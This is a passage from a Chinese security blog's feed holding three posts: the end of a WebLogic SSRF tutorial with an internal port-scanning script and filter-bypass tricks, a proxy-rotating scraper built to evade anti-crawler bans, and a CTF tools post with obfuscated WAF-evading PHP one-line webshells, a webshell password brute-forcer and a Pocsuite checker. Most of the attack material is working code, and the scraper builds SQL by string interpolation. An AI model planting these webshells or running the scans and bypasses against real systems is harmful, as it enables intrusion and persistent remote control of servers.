class="line"></div><div class="line">for port in port_list:</div><div class="line">    que.put(port)</div><div class="line">def run():</div><div class="line">    for i in range(1,256):</div><div class="line">        while que.qsize() &gt; 0:</div><div class="line">            port = que.get()</div><div class="line">            #print &quot;ip:172.16.2.&#123;ip&#125;:&#123;port&#125;&quot;.format(ip=i,port=port)</div><div class="line">            url = &quot;http://xxx.xxx.xxx/uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.16.2.%d:%d&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&quot; % (i,port)</div><div class="line">            try:</div><div class="line">                content = requests.get(url,timeout=20,verify=False).content</div><div class="line">                #ssrf检测</div><div class="line">                result1 = re.findall(&apos;weblogic.uddi.client.structures.exception.XML_SoapException&apos;,content)</div><div class="line">                result2 = re.findall(&apos;but could not connect&apos;,content)</div><div class="line">                result3 = re.findall(&apos;No route to host&apos;,content)</div><div class="line">                if len(result1) != 0 and len(result2) == 0 and len(result3) == 0:</div><div class="line">                        print &quot;http://172.16.2.&#123;ip&#125;:&#123;port&#125; is open&quot;.format(ip=i,port=port)</div><div class="line">            except Exception,e:</div><div class="line">                    pass</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    for i in xrange(20):</div><div class="line">        t=Thread(target=run)</div><div class="line">        thread_list.append(t)</div><div class="line">    for t in thread_list:</div><div class="line">        t.start()</div><div class="line">    for t in thread_list:</div><div class="line">        t.join()</div></pre></td></tr></table></figure></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/ssrf5.png" alt=""></p>
<h2 id="SSRF绕过技巧"><a href="#SSRF绕过技巧" class="headerlink" title="SSRF绕过技巧"></a>SSRF绕过技巧</h2><h3 id="1、"><a href="#1、" class="headerlink" title="1、@"></a>1、@</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://abc@127.0.0.1</div><div class="line">实际上是以用户名abc连接到站点127.0.0.1，同理</div><div class="line">http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8</div></pre></td></tr></table></figure>
<h3 id="2、添加端口号"><a href="#2、添加端口号" class="headerlink" title="2、添加端口号"></a>2、添加端口号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:8080</div></pre></td></tr></table></figure>
<h3 id="3、短地址"><a href="#3、短地址" class="headerlink" title="3、短地址"></a>3、短地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ᄒ.ws/ir</div></pre></td></tr></table></figure>
<h3 id="4、特殊域名"><a href="#4、特殊域名" class="headerlink" title="4、特殊域名"></a>4、特殊域名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">10.0.0.1.xip.io == 10.0.0.1</div><div class="line">www.10.0.0.1.xip.io == 10.0.0.1</div><div class="line">fuzz.ssrf.10.0.0.1.xip.io == 10.0.0.1</div></pre></td></tr></table></figure>
<h3 id="5、ip进制转换"><a href="#5、ip进制转换" class="headerlink" title="5、ip进制转换"></a>5、ip进制转换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">首先以 . 分割数字</div><div class="line">然后进行10进制转换16进制</div><div class="line">然后把这串十六进制合在一起再转换成8进制</div><div class="line">然后指定协议 http://，可用任意个 0 作为前缀：http://000007F000001；</div><div class="line">（在前面添加过多的 0，在实际SSRF或者XSS中有时会成为绕过过滤的大杀器）</div><div class="line"></div><div class="line">1、利用八进制IP地址绕过</div><div class="line">ping -w 0 -n 1 012.0.0.1</div><div class="line">2、利用十六进制IP地址绕过</div><div class="line">ping -w 0 -n 1 0xa.0.0.1</div><div class="line">3、 利用十进制的IP地址绕过</div><div class="line">ping -w 0 -n 1 167772161</div><div class="line">在PHP里使用ip2long</div><div class="line">在Python里使用inet_aton</div><div class="line">4、利用IP地址的省略写法绕过</div><div class="line">ping -w 0 -n 1 10.1</div></pre></td></tr></table></figure>
<h1 id="SSRF防御"><a href="#SSRF防御" class="headerlink" title="SSRF防御"></a>SSRF防御</h1><p>推荐参考：<br><a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="external">谈一谈如何在Python开发中拒绝SSRF漏洞</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> WAF绕过 </tag>
            
            <tag> 自动化 </tag>
            
            <tag> SSRF </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[爬虫入库实战之干死反爬虫]]></title>
      <url>/2017/06/02/%E7%88%AC%E8%99%AB%E5%85%A5%E5%BA%93%E5%AE%9E%E6%88%98%E4%B9%8B%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86/</url>
      <content type="html"><![CDATA[<p>爬虫因为需要大量抓取网页，所以有可能会被ban IP，所以通常使用加UA、代理、XFF等伪造真实IP等策略，其中X-Forwarded-For,Client-ip,REMOTE_ADDR可以使用burp的爆破模块，四个payload随机生成就行了，本文重点使用UA、代理IP测试。<br><a id="more"></a></p>
<h1 id="0x00-设置编码"><a href="#0x00-设置编码" class="headerlink" title="0x00 设置编码"></a>0x00 设置编码</h1><p>首先设置下默认编码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">文件编码</div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(&apos;utf-8&apos;)</div><div class="line">数据库编码</div><div class="line">CREATE DATABASE &apos;proxy&apos; DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</div><div class="line">数据传输编码</div><div class="line">charset=&apos;utf8mb4&apos;</div></pre></td></tr></table></figure></p>
<h1 id="0x01-设置UA"><a href="#0x01-设置UA" class="headerlink" title="0x01 设置UA"></a>0x01 设置UA</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">config=&#123;</div><div class="line">        &apos;NUM&apos;:10,</div><div class="line">        &apos;timeout&apos;:5,</div><div class="line">        &apos;USER_AGENTS&apos;:[</div><div class="line">    &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;,</div><div class="line">    &quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;,</div><div class="line">    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;,</div><div class="line">    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;,</div><div class="line">    &quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;,</div><div class="line">    &quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;,</div><div class="line">    &quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;,]&#125;</div><div class="line">headers = &#123;&apos;User-Agent&apos;: random.choice(config[&apos;USER_AGENTS&apos;])&#125;</div></pre></td></tr></table></figure>
<p>可以使用字典方式，这里我为了简便就随机粘了几个。<br><img src="http://oa8y5guqs.bkt.clouddn.com/spider_1.png" alt=""></p>
<h1 id="0x02-设置交互方式"><a href="#0x02-设置交互方式" class="headerlink" title="0x02 设置交互方式"></a>0x02 设置交互方式</h1><p>数据交互使用python的PyMySQL模块，支持py2,py3。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">conn = pymysql.connect(</div><div class="line"> host=&apos;127.0.0.1&apos;,</div><div class="line"> port=3306,</div><div class="line"> user=&apos;root&apos;,</div><div class="line"> passwd=&apos;123456&apos;,</div><div class="line"> db=&apos;proxy&apos;,</div><div class="line"> charset=&apos;utf8mb4&apos;,</div><div class="line"> )</div><div class="line">cur = conn.cursor()</div><div class="line">sql = &quot;INSERT INTO proxylist(title,price) VALUES (&apos;test1&apos;,&apos;100&apos;)&quot;</div><div class="line">cur.execute(sql)</div></pre></td></tr></table></figure></p>
<h1 id="0x03-代理获取"><a href="#0x03-代理获取" class="headerlink" title="0x03 代理获取"></a>0x03 代理获取</h1><p>代理使用免费的西刺代理(没钱-.-)，使用requests、BeautifulSoup做数据处理。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">r = requests.get(url=url_xichi,headers=headers)</div><div class="line">soup = bs(r.content,&apos;lxml&apos;)</div><div class="line">datas = soup.find_all(name=&apos;tr&apos;,attrs=&#123;&apos;class&apos;:re.compile(&apos;(odd)|()&apos;)&#125;)</div><div class="line">for data in datas:</div><div class="line">    proxys = data.find_all(name=&apos;td&apos;)</div><div class="line">    ip = str(proxys[1].string)</div><div class="line">    port = str(proxys[2].string)</div><div class="line">    type = str(proxys[5].string).lower()</div><div class="line">    avail_proxy = proxy_check(ip,port,type)</div><div class="line">    if avail_proxy != None:</div><div class="line">        return avail_proxy</div></pre></td></tr></table></figure></p>
<h1 id="0x04-代理验证"><a href="#0x04-代理验证" class="headerlink" title="0x04 代理验证"></a>0x04 代理验证</h1><p>验证代理的存活性，使用站长工具的ip定位实现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">try:</div><div class="line">    r = requests.get(url=url_check,proxies=proxylist,timeout=5)</div><div class="line">    find_ip = re.findall(r&apos;\&apos;(.*?)\&apos;&apos;,r.text)[0]</div><div class="line">    if ip == find_ip:</div><div class="line">        return proxylist</div><div class="line">except Exception,e:</div><div class="line">    pass</div></pre></td></tr></table></figure></p>
<h1 id="0x05-数据入库"><a href="#0x05-数据入库" class="headerlink" title="0x05 数据入库"></a>0x05 数据入库</h1><p>这里就以谷安网校的课程来爬，主要爬课程名字及对应的价格。<br>效果如下图：<br><img src="http://oa8y5guqs.bkt.clouddn.com/spider_2.png" alt=""><br><strong>附：源代码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Author：W2n1ck</div><div class="line">@Index：http://www.w2n1ck.com/</div><div class="line">&apos;&apos;&apos;</div><div class="line">import random</div><div class="line">import re</div><div class="line">import requests</div><div class="line">import pymysql</div><div class="line">import sys</div><div class="line">import time</div><div class="line"></div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(&apos;utf-8&apos;)</div><div class="line"></div><div class="line">from bs4 import BeautifulSoup as bs</div><div class="line"></div><div class="line">config=&#123;</div><div class="line">        &apos;NUM&apos;:10,</div><div class="line">        &apos;timeout&apos;:5,</div><div class="line">        &apos;USER_AGENTS&apos;:[</div><div class="line">    &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;,</div><div class="line">    &quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;,</div><div class="line">    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;,</div><div class="line">    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;,</div><div class="line">    &quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;,</div><div class="line">    &quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;,</div><div class="line">    &quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;,]&#125;</div><div class="line">headers = &#123;&apos;User-Agent&apos;: random.choice(config[&apos;USER_AGENTS&apos;])&#125;</div><div class="line">proxy = []</div><div class="line"></div><div class="line">conn = pymysql.connect(</div><div class="line"> host=&apos;127.0.0.1&apos;,</div><div class="line"> port=3306,</div><div class="line"> user=&apos;root&apos;,</div><div class="line"> passwd=&apos;123456&apos;,</div><div class="line"> db=&apos;proxy&apos;,</div><div class="line"> charset=&apos;utf8mb4&apos;,</div><div class="line"> )</div><div class="line">cur = conn.cursor()</div><div class="line">#sql = &quot;INSERT INTO proxylist(title,price) VALUES (&apos;test2&apos;,&apos;200&apos;)&quot;</div><div class="line">#cur.execute(sql)</div><div class="line"></div><div class="line">def proxy_spider():</div><div class="line">    url_xichi = &apos;http://www.xicidaili.com/nn/&apos;</div><div class="line">    r = requests.get(url=url_xichi,headers=headers)</div><div class="line">    soup = bs(r.content,&apos;lxml&apos;)</div><div class="line">    datas = soup.find_all(name=&apos;tr&apos;,attrs=&#123;&apos;class&apos;:re.compile(&apos;(odd)|()&apos;)&#125;)</div><div class="line">    #print datas</div><div class="line">    for data in datas:</div><div class="line">        proxys = data.find_all(name=&apos;td&apos;)</div><div class="line">        ip = str(proxys[1].string)</div><div class="line">        #ip = &apos;http://&apos;+ip</div><div class="line">        port = str(proxys[2].string)</div><div class="line">        type = str(proxys[5].string).lower()</div><div class="line">        avail_proxy = proxy_check(ip,port,type)</div><div class="line">        if avail_proxy != None:</div><div class="line">            return avail_proxy</div><div class="line">def proxy_check(ip,port,type):</div><div class="line">    url_check = &apos;http://ip.chinaz.com/getip.aspx&apos;</div><div class="line">    proxylist = &#123;&#125;</div><div class="line">    proxylist[type] = &apos;%s:%s&apos; % (ip,port)</div><div class="line">    #print proxylist</div><div class="line">    try:</div><div class="line">        r = requests.get(url=url_check,proxies=proxylist,timeout=5)</div><div class="line">        find_ip = re.findall(r&apos;\&apos;(.*?)\&apos;&apos;,r.text)[0]</div><div class="line">        #print find_ip</div><div class="line">        if ip == find_ip:</div><div class="line">            return proxylist</div><div class="line">            #proxy.append(find_ip)</div><div class="line">        #print proxy</div><div class="line">    except Exception,e:</div><div class="line">        pass</div><div class="line"></div><div class="line">def decode_str(str):</div><div class="line">    return str.replace(&apos; &apos;,&apos;&apos;).replace(&apos;\t&apos;,&apos;&apos;).replace(&apos;\n&apos;,&apos;&apos;).encode(&apos;utf-8&apos;)</div><div class="line"></div><div class="line">def get_title_price(url):</div><div class="line">    proxy_url = proxy_spider()</div><div class="line">    r = requests.get(url=url,proxies=proxy_url,timeout=20)</div><div class="line">    content = r.content</div><div class="line">    soup = bs(content,&apos;lxml&apos;)</div><div class="line">    content_titles = soup.find_all(name=&apos;a&apos;,attrs=&#123;&apos;class&apos;:&apos;link-dark&apos;&#125;)</div><div class="line">    content_prices = soup.find_all(name=&apos;span&apos;,attrs=&#123;&apos;class&apos;:&apos;price&apos;&#125;)</div><div class="line">    for title,price in zip(content_titles,content_prices):</div><div class="line">        tmp_title = decode_str(str(title.string))</div><div class="line">        tmp_price = decode_str(str(price.string))</div><div class="line">        print tmp_title,tmp_price</div><div class="line">        sql = &quot;INSERT INTO proxylist(title,price) VALUES (&apos;%s&apos;,&apos;%s&apos;)&quot;%(tmp_title,tmp_price)</div><div class="line">        cur.execute(sql)</div><div class="line">if __name__==&apos;__main__&apos;:</div><div class="line">    #proxy_spider()</div><div class="line">    url_spider = &apos;http://edu.aqniu.com/course/explore?page=&apos;</div><div class="line">    for i in range(12):</div><div class="line">        spider_url = url_spider+str(i)</div><div class="line">        get_title_price(spider_url)</div><div class="line">        time.sleep(random.random()*1)</div><div class="line">    cur.close()</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> Python </tag>
            
            <tag> 自动化 </tag>
            
            <tag> 代理 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF线下赛相关工具]]></title>
      <url>/2017/05/16/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7/</url>
      <content type="html"><![CDATA[<p>上上周打了大学生涯的最后一场CTF比赛，感觉给老师丢人了，自己赛前准备的东西也没咋用上，很憋屈啊！不说了，还是太菜！这两周忙着毕业设计的事，一直没时间写。把自己收集的资料分享下吧，如有错误，请大牛们指导下。<br><a id="more"></a></p>
<h1 id="一、linux-tcpdump使用"><a href="#一、linux-tcpdump使用" class="headerlink" title="一、linux tcpdump使用"></a>一、linux tcpdump使用</h1><p>tcpdump的重要性不用我说了吧，都懂，但是在CTF中可能会没有权限使用。但是工作中肯定会用到的，相信我，不要为CTF而CTF…（不好意思扯淡了 =.=）</p>
<h2 id="1-1、过滤主机"><a href="#1-1、过滤主机" class="headerlink" title="1.1、过滤主机"></a>1.1、过滤主机</h2><p>抓取所有经过eth1，目的或源地址是192.168.1.1的网络数据<br>    tcpdump -i eth1 host 192.168.1.1<br>指定源地址<br>    tcpdump -i eth1 src host 192.168.1.1<br>指定目的地址<br>    tcpdump -i eth1 dst host 192.168.1.1</p>
<h2 id="1-2、过滤端口"><a href="#1-2、过滤端口" class="headerlink" title="1.2、过滤端口"></a>1.2、过滤端口</h2><p>抓取所有经过eth1，目的或源端口是25的网络数据<br>    tcpdump -i eth1 port 25<br>指定源端口<br>    tcpdump -i eth1 src port 25<br>指定目的端口<br>    tcpdump -i eth1 dst port 25</p>
<h2 id="1-3、网络过滤"><a href="#1-3、网络过滤" class="headerlink" title="1.3、网络过滤"></a>1.3、网络过滤</h2><pre><code>tcpdump -i eth1 net 192.168
tcpdump -i eth1 src net 192.168
tcpdump -i eth1 dst net 192.168
</code></pre><h2 id="1-4、协议过滤"><a href="#1-4、协议过滤" class="headerlink" title="1.4、协议过滤"></a>1.4、协议过滤</h2><pre><code>tcpdump -i eth1 arp
tcpdump -i eth1 ip
tcpdump -i eth1 tcp
tcpdump -i eth1 udp
tcpdump -i eth1 icmp
</code></pre><h2 id="1-5、常用表达式"><a href="#1-5、常用表达式" class="headerlink" title="1.5、常用表达式"></a>1.5、常用表达式</h2><pre><code>非 : ! or &quot;not&quot; (去掉双引号)
且 : &amp;&amp; or &quot;and&quot;
或 : || or &quot;or&quot;
</code></pre><p>抓取所有经过eth1，目的地址是192.168.1.254或192.168.1.200端口是80的TCP数据<br>    tcpdump -i eth1 ‘((tcp) and (port 80) and ((dst host 192.168.1.254) or (dst host 192.168.1.200)))’<br>抓取所有经过eth1，目标MAC地址是00:01:02:03:04:05的ICMP数据<br>    tcpdump -i eth1 ‘((icmp) and ((ether dst host 00:01:02:03:04:05)))’<br>抓取所有经过eth1，目的网络是192.168，但目的主机不是192.168.1.200的TCP数据<br>    tcpdump -i eth1 ‘((tcp) and ((dst net 192.168) and (not dst host 192.168.1.200)))’</p>
<h1 id="二、一句话木马"><a href="#二、一句话木马" class="headerlink" title="二、一句话木马"></a>二、一句话木马</h1><p>一句话木马主要达到的目的就是就算别人看到了这个webshell，他们也不会用。不然别人直接利用你，用的webshell收割flag。我从自己搜集的过waf的webshell中挑了两个。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&apos;n985de9&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt;</div></pre></td></tr></table></figure></p>
<p>原理我就不讲了，看一下你就明白了，很简单。<code>QGV2YWwoJF9QT1NUWzBdKTs=</code>随意变。<br>菜刀配置填<code>&lt;O&gt;n985de9=QGV2YWwoJF9QT1NUWzBdKTs=&lt;/O&gt;</code><br>连接密码:0（零）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt;</div></pre></td></tr></table></figure></p>
<p>菜刀连接密码:1，自己可以改改，主要学思路。</p>
<h1 id="三、webshell爆破"><a href="#三、webshell爆破" class="headerlink" title="三、webshell爆破"></a>三、webshell爆破</h1><p>简单粗暴，只要发现，啥都不用想，拿起工具就是干！<br>webshell爆破采用之前tools分享的思路，Apache一次允许同时提交1000个参数， IIS允许一次提交5883个参数。<br>这里我主要用了两个，一个是K8写的GUI版本的，支持PHP、JSP、ASP、ASPX等<br><img src="http://oa8y5guqs.bkt.clouddn.com/CTF1.png" alt=""><br>一个是自己写的PHP的。<br><img src="http://oa8y5guqs.bkt.clouddn.com/CTF2.png" alt=""><br>主要代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">1000处理</div><div class="line">for i in range(0,dics):</div><div class="line">    new_group = []</div><div class="line">    for m in range(i*1000,(i+1)*1000):</div><div class="line">        new_group.append(group[m])</div><div class="line">        m += 1</div><div class="line">    for n in new_group:</div><div class="line">        post_data[n] = &apos;echo &quot;password is :%s&quot;;&apos; % n</div><div class="line">    req = requests.post(url,data=post_data)</div><div class="line">    print u&quot;正在进行第 %s 组字典爆破&quot; % str(i + 1)</div><div class="line">    print req.content+&apos;****************************-SUCCESS!&apos;</div><div class="line">    post_data.clear()</div><div class="line">余数处理</div><div class="line">new_group1 = []</div><div class="line">for kk in range(dics*1000, len(content)):</div><div class="line">    new_group1.append(group[kk])</div><div class="line">    kk += 1</div><div class="line">for each in new_group1:</div><div class="line">    post_data[each] = &apos;echo &quot;password is %s&quot;;&apos; % each</div><div class="line">r = requests.post(url,data=post_data)</div><div class="line">print u&quot;正在进行余数字典爆破&quot;</div><div class="line">print r.content+&apos;****************************-SUCCESS!&apos;</div></pre></td></tr></table></figure></p>
<h1 id="四、批量发包程序"><a href="#四、批量发包程序" class="headerlink" title="四、批量发包程序"></a>四、批量发包程序</h1><p>目的很简单，就是对所在网段的其他主机批量进行某一个操作，具体怎么做，拿它干嘛，看自己思维了。<br>主要代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">def sender(domain):</div><div class="line">    #proxies = &#123; &quot;http&quot;: &quot;http://127.0.0.1:8888&quot;&#125;</div><div class="line">    url = domain</div><div class="line">    post_data =&quot;password=ls&quot;</div><div class="line">    payload = &quot;header test&quot;</div><div class="line">    headers = &#123;&apos;content-type&apos;: payload,&apos;User-Agent&apos;:random.choice(config[&apos;USER_AGENTS&apos;])&#125;</div><div class="line">    request = urllib2.Request(url,post_data,headers)</div><div class="line">    response = urllib2.urlopen(request,timeout=config[&apos;timeout&apos;])</div><div class="line">    if response.getcode() == 200:</div><div class="line">        res = response.read()</div><div class="line">        return res</div><div class="line">    else:</div><div class="line">        return 0</div></pre></td></tr></table></figure></p>
<p>加入了多线程，随机UA等(其实Python的多线程很鸡肋的，你要测试过对比下时间你就知道了。原因你可以查下进程、线程关于多核CPU的利用相关的一些资料)。</p>
<h1 id="五、Pocsuite"><a href="#五、Pocsuite" class="headerlink" title="五、Pocsuite"></a>五、Pocsuite</h1><p>神器，就不解释了。其实原理很简单，做了个批量化的框架，自己写插件。主要验证代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">def _verify(self):</div><div class="line">        import re</div><div class="line">        result = &#123;&#125;</div><div class="line">        webshellpath = &quot;/ctf/webshell.php&quot;   # 配置webshell所在目录</div><div class="line">        payload = &quot;&#123;domain&#125;&quot; + webshellpath</div><div class="line"></div><div class="line">        for pwd in self.pwdList:</div><div class="line">            exp_url = payload.format(domain=self.url) + &apos;?&apos; + pwd + &apos;=echo &quot;dropsec&quot;;&apos;</div><div class="line">            print exp_url</div><div class="line"></div><div class="line">        # exp_url = (payload.format(domain=self.url))</div><div class="line">            data = &#123;</div><div class="line">                pwd : u&apos;&apos;&apos;echo &quot;dropsec&quot;;&apos;&apos;&apos;</div><div class="line">            &#125;</div><div class="line">            try:</div><div class="line">                response = req.post(exp_url, data=data, timeout=10, verify=False)</div><div class="line">            except Exception, e:</div><div class="line">                return self.parse_output(result)</div><div class="line">            if response.status_code != 404:</div><div class="line">                result[&apos;VerifyInfo&apos;] = &#123;&#125;</div><div class="line">                result[&apos;VerifyInfo&apos;][&apos;status_code&apos;] = response.status_code</div><div class="line">                result[&apos;VerifyInfo&apos;][&apos;is&apos;] = &apos;password wrong&apos;</div><div class="line">                if &apos;dropsec&apos; in response.content:</div><div class="line">                    result[&apos;VerifyInfo&apos;][&apos;url&apos;] = 